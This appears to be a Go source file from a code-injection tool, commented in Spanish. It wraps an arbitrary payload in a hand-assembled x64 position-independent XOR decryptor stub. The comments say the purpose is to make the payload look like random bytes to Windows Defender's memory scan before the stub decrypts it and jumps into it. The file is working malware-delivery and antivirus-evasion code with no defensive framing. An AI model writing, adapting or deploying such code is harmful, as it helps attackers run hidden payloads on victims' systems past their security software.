package injection

import (
	"encoding/binary"
	"math/rand"
)

// wrapWithDecryptor envuelve el payload con un stub XOR position-independent.
//
// Layout en memoria: [stub 46 bytes][key 1 byte][size 4 bytes][payload cifrado...]
//
// El stub:
//   1. Obtiene su propia dirección base (call/pop trick)
//   2. Lee el key byte en base+46
//   3. Lee el tamaño del payload en base+47
//   4. XOR-descifra el payload en base+51
//   5. Salta al payload ya descifrado
//
// Defender escanea la memoria ANTES de que el stub corra → ve bytes aleatorios.
func wrapWithDecryptor(payload []byte) []byte {
	// Clave XOR aleatoria, evitar 0x00 (no-op) y 0xFF
	key := byte(rand.Intn(254) + 1)

	// Stub x64 position-independent (46 bytes).
	// Offsets hardcodeados: key@46(0x2E), size@47(0x2F), payload@51(0x33)
	stub := []byte{
		// call +5: pushea addr de la siguiente instrucción, salta a ella
		0xE8, 0x00, 0x00, 0x00, 0x00,
		// pop rbx  → rbx = dirección de este byte (base+5)
		0x5B,
		// sub rbx, 5  → rbx = base del stub
		0x48, 0x83, 0xEB, 0x05,
		// xor rcx, rcx  (contador = 0)
		0x48, 0x31, 0xC9,
		// movzx eax, byte [rbx+0x2E]  → al = key
		0x0F, 0xB6, 0x83, 0x2E, 0x00, 0x00, 0x00,
		// mov edx, [rbx+0x2F]  → edx = payload_size
		0x8B, 0x93, 0x2F, 0x00, 0x00, 0x00,
		// lea rsi, [rbx+0x33]  → rsi = inicio del payload cifrado
		0x48, 0x8D, 0xB3, 0x33, 0x00, 0x00, 0x00,
		// -- loop (offset 33) --
		// xor byte [rsi+rcx], al
		0x30, 0x04, 0x0E,
		// inc rcx
		0x48, 0xFF, 0xC1,
		// cmp rcx, rdx
		0x48, 0x39, 0xD1,
		// jl -11  → vuelve al xor byte (offset 33)
		0x7C, 0xF5,
		// jmp rsi  → ejecuta payload descifrado
		0xFF, 0xE6,
	}

	// Cifrar payload
	enc := make([]byte, len(payload))
	for i, b := range payload {
		enc[i] = b ^ key
	}

	// Serializar tamaño como uint32 little-endian
	sz := make([]byte, 4)
	binary.LittleEndian.PutUint32(sz, uint32(len(payload)))

	// Ensamblar: stub + key + size + payload_cifrado
	out := make([]byte, 0, len(stub)+1+4+len(enc))
	out = append(out, stub...)
	out = append(out, key)
	out = append(out, sz...)
	out = append(out, enc...)
	return out
}
